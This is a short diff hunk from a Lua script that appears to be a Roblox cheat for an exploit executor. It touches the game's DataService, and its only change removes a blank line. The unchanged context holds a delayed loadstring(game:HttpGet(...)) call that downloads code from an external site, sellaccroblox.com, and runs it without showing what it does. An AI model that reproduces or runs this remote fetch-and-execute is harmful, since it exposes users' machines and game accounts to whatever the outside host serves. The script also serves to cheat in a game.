@@ -3,7 +3,6 @@ getgenv().daubuoi = true
 task.delay(1, function()
     loadstring(game:HttpGet("https://sellaccroblox.com/raw/view.php?file=lilbip%2FextraGAG.txt"))()
 end)
-
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local LocalDataService = require(game:GetService("ReplicatedStorage"):WaitForChild("Modules", 10).DataService)
